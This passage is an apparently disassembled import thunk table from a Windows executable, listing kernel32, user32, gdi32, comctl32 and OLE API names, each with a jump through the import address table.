jmp [ OpenProcess@IAT ]
RaiseException
jmp [ RaiseException@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ReleaseMutex
jmp [ ReleaseMutex@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
ResumeThread
jmp [ ResumeThread@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
SetConsoleCtrlHandler
jmp [ SetConsoleCtrlHandler@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetErrorMode
jmp [ SetErrorMode@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetHandleCount
jmp [ SetHandleCount@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SignalObjectAndWait
jmp [ SignalObjectAndWait@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
Sleep
jmp [ Sleep@IAT ]
SwitchToThread
jmp [ SwitchToThread@IAT ]
TlsAlloc
jmp [ TlsAlloc@IAT ]
TlsFree
jmp [ TlsFree@IAT ]
TlsGetValue
jmp [ TlsGetValue@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
UnhandledExceptionFilter
jmp [ UnhandledExceptionFilter@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualFree
jmp [ VirtualFree@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
VirtualQueryEx
jmp [ VirtualQueryEx@IAT ]
WaitForMultipleObjectsEx
jmp [ WaitForMultipleObjectsEx@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
WritePrivateProfileStringW
jmp [ WritePrivateProfileStringW@IAT ]
lstrcmpW
jmp [ lstrcmpW@IAT ]
lstrcpyW
jmp [ lstrcpyW@IAT ]
lstrcpynA
jmp [ lstrcpynA@IAT ]
lstrcpynW
jmp [ lstrcpynW@IAT ]
lstrlenW
jmp [ lstrlenW@IAT ]
GetFileVersionInfoSizeW
jmp [ GetFileVersionInfoSizeW@IAT ]
GetFileVersionInfoW
jmp [ GetFileVersionInfoW@IAT ]
VerQueryValueW
jmp [ VerQueryValueW@IAT ]
FlatSB_GetScrollInfo
jmp [ FlatSB_GetScrollInfo@IAT ]
FlatSB_GetScrollPos
jmp [ FlatSB_GetScrollPos@IAT ]
FlatSB_SetScrollInfo
jmp [ FlatSB_SetScrollInfo@IAT ]
FlatSB_SetScrollPos
jmp [ FlatSB_SetScrollPos@IAT ]
FlatSB_SetScrollProp
jmp [ FlatSB_SetScrollProp@IAT ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_Draw
jmp [ ImageList_Draw@IAT ]
ImageList_DrawEx
jmp [ ImageList_DrawEx@IAT ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
ImageList_SetImageCount
jmp [ ImageList_SetImageCount@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
InitCommonControls
jmp [ InitCommonControls@IAT ]
InitializeFlatSB
jmp [ InitializeFlatSB@IAT ]
_TrackMouseEvent
jmp [ _TrackMouseEvent@IAT ]
BitBlt
jmp [ BitBlt@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateCompatibleBitmap
jmp [ CreateCompatibleBitmap@IAT ]
CreateCompatibleDC
jmp [ CreateCompatibleDC@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateFontIndirectW
jmp [ CreateFontIndirectW@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
CreateRectRgn
jmp [ CreateRectRgn@IAT ]
CreateSolidBrush
jmp [ CreateSolidBrush@IAT ]
DeleteDC
jmp [ DeleteDC@IAT ]
DeleteObject
jmp [ DeleteObject@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtTextOutW
jmp [ ExtTextOutW@IAT ]
FrameRgn
jmp [ FrameRgn@IAT ]
GetBitmapBits
jmp [ GetBitmapBits@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetDIBits
jmp [ GetDIBits@IAT ]
GetDeviceCaps
jmp [ GetDeviceCaps@IAT ]
GetObjectW
jmp [ GetObjectW@IAT ]
GetPaletteEntries
jmp [ GetPaletteEntries@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetRgnBox
jmp [ GetRgnBox@IAT ]
GetStockObject
jmp [ GetStockObject@IAT ]
GetSystemPaletteEntries
jmp [ GetSystemPaletteEntries@IAT ]
GetTextExtentPoint32W
jmp [ GetTextExtentPoint32W@IAT ]
GetTextMetricsW
jmp [ GetTextMetricsW@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
IntersectClipRect
jmp [ IntersectClipRect@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
PatBlt
jmp [ PatBlt@IAT ]
Polyline
jmp [ Polyline@IAT ]
RealizePalette
jmp [ RealizePalette@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
RestoreDC
jmp [ RestoreDC@IAT ]
SaveDC
jmp [ SaveDC@IAT ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SelectObject
jmp [ SelectObject@IAT ]
SelectPalette
jmp [ SelectPalette@IAT ]
SetBkColor
jmp [ SetBkColor@IAT ]
SetBkMode
jmp [ SetBkMode@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetStretchBltMode
jmp [ SetStretchBltMode@IAT ]
SetTextColor
jmp [ SetTextColor@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
StretchBlt
jmp [ StretchBlt@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
AlphaBlend
jmp [ AlphaBlend@IAT ]
ShellExecuteA
jmp [ ShellExecuteA@IAT ]
Shell_NotifyIconA
jmp [ Shell_NotifyIconA@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcW
jmp [ CallWindowProcW@IAT ]
CharLowerW
jmp [ CharLowerW@IAT ]
CharNextW
jmp [ CharNextW@IAT ]
CharToOemW
jmp [ CharToOemW@IAT ]
CharUpperBuffW
jmp [ CharUpperBuffW@IAT ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ChildWindowFromPoint
jmp [ ChildWindowFromPoint@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
CreateWindowExW
jmp [ CreateWindowExW@IAT ]
DefFrameProcW
jmp [ DefFrameProcW@IAT ]
DefMDIChildProcW
jmp [ DefMDIChildProcW@IAT ]
DefWindowProcW
jmp [ DefWindowProcW@IAT ]
DeleteMenu
jmp [ DeleteMenu@IAT ]
DestroyCursor
jmp [ DestroyCursor@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DispatchMessageW
jmp [ DispatchMessageW@IAT ]
DrawEdge
jmp [ DrawEdge@IAT ]
DrawFocusRect
jmp [ DrawFocusRect@IAT ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
DrawTextExW
jmp [ DrawTextExW@IAT ]
DrawTextW
jmp [ DrawTextW@IAT ]
EnableMenuItem
jmp [ EnableMenuItem@IAT ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumChildWindows
jmp [ EnumChildWindows@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
FillRect
jmp [ FillRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
FindWindowExW
jmp [ FindWindowExW@IAT ]
FindWindowW
jmp [ FindWindowW@IAT ]
FrameRect
jmp [ FrameRect@IAT ]
GetActiveWindow
jmp [ GetActiveWindow@IAT ]
GetCapture
jmp [ GetCapture@IAT ]
GetClassInfoW
jmp [ GetClassInfoW@IAT ]
GetClassLongW
jmp [ GetClassLongW@IAT ]
GetClassNameW
jmp [ GetClassNameW@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDesktopWindow
jmp [ GetDesktopWindow@IAT ]
GetFocus
jmp [ GetFocus@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextW
jmp [ GetKeyNameTextW@IAT ]
GetKeyState
jmp [ GetKeyState@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardLayoutNameW
jmp [ GetKeyboardLayoutNameW@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetKeyboardType
jmp [ GetKeyboardType@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemCount
jmp [ GetMenuItemCount@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoW
jmp [ GetMenuItemInfoW@IAT ]
GetMenuState
jmp [ GetMenuState@IAT ]
GetMenuStringW
jmp [ GetMenuStringW@IAT ]
GetMessagePos
jmp [ GetMessagePos@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropW
jmp [ GetPropW@IAT ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
GetSystemMetrics
jmp [ GetSystemMetrics@IAT ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowLongW
jmp [ GetWindowLongW@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
GetWindowTextW
jmp [ GetWindowTextW@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InflateRect
jmp [ InflateRect@IAT ]
InsertMenuItemW
jmp [ InsertMenuItemW@IAT ]
InsertMenuW
jmp [ InsertMenuW@IAT ]
IntersectRect
jmp [ IntersectRect@IAT ]
InvalidateRect
jmp [ InvalidateRect@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsDialogMessageW
jmp [ IsDialogMessageW@IAT ]
IsIconic
jmp [ IsIconic@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsWindowUnicode
jmp [ IsWindowUnicode@IAT ]
IsWindowVisible
jmp [ IsWindowVisible@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapW
jmp [ LoadBitmapW@IAT ]
LoadCursorW
jmp [ LoadCursorW@IAT ]
LoadIconW
jmp [ LoadIconW@IAT ]
LoadKeyboardLayoutW
jmp [ LoadKeyboardLayoutW@IAT ]
LoadStringW
jmp [ LoadStringW@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MapVirtualKeyW
jmp [ MapVirtualKeyW@IAT ]
MapWindowPoints
jmp [ MapWindowPoints@IAT ]
MessageBeep
jmp [ MessageBeep@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
MessageBoxW
jmp [ MessageBoxW@IAT ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
MsgWaitForMultipleObjectsEx
jmp [ MsgWaitForMultipleObjectsEx@IAT ]
OffsetRect
jmp [ OffsetRect@IAT ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PeekMessageW
jmp [ PeekMessageW@IAT ]
PostMessageA
jmp [ PostMessageA@IAT ]
PostMessageW
jmp [ PostMessageW@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ PtInRect@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassW
jmp [ RegisterClassW@IAT ]
RegisterWindowMessageW
jmp [ RegisterWindowMessageW@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
RemovePropW
jmp [ RemovePropW@IAT ]
ScreenToClient
jmp [ ScreenToClient@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SendInput
jmp [ SendInput@IAT ]
SendMessageA
jmp [ SendMessageA@IAT ]
SendMessageW
jmp [ SendMessageW@IAT ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongW
jmp [ SetClassLongW@IAT ]
SetCursor
jmp [ SetCursor@IAT ]
SetFocus
jmp [ SetFocus@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenu
jmp [ SetMenu@IAT ]
SetMenuItemInfoW
jmp [ SetMenuItemInfoW@IAT ]
SetParent
jmp [ SetParent@IAT ]
SetPropW
jmp [ SetPropW@IAT ]
SetRect
jmp [ SetRect@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowLongW
jmp [ SetWindowLongW@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowPos
jmp [ SetWindowPos@IAT ]
SetWindowTextW
jmp [ SetWindowTextW@IAT ]
SetWindowsHookExW
jmp [ SetWindowsHookExW@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
ShowWindow
jmp [ ShowWindow@IAT ]
SystemParametersInfoW
jmp [ SystemParametersInfoW@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassW
jmp [ UnregisterClassW@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
keybd_event
jmp [ keybd_event@IAT ]
mouse_event
jmp [ mouse_event@IAT ]
wsprintfA
jmp [ wsprintfA@IAT ]
timeKillEvent
jmp [ timeKillEvent@IAT ]
timeSetEvent
jmp [ timeSetEvent@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
CoTaskMemAlloc
jmp [ CoTaskMemAlloc@IAT ]
OleInitialize
jmp [ OleInitialize@IAT ]
OleUninitialize
jmp [ OleUninitialize@IAT ]
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
SafeArrayPtrOfIndex
jmp [ SafeArrayPtrOfIndex@IAT ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
VariantClear
jmp [ VariantClear@IAT ]
VariantCopy
jmp [ VariantCopy@IAT ]
VariantInit
jmp [ VariantInit@IAT ]
GetModuleFileNameExA
jmp [ GetModuleFileNameExA@IAT ]
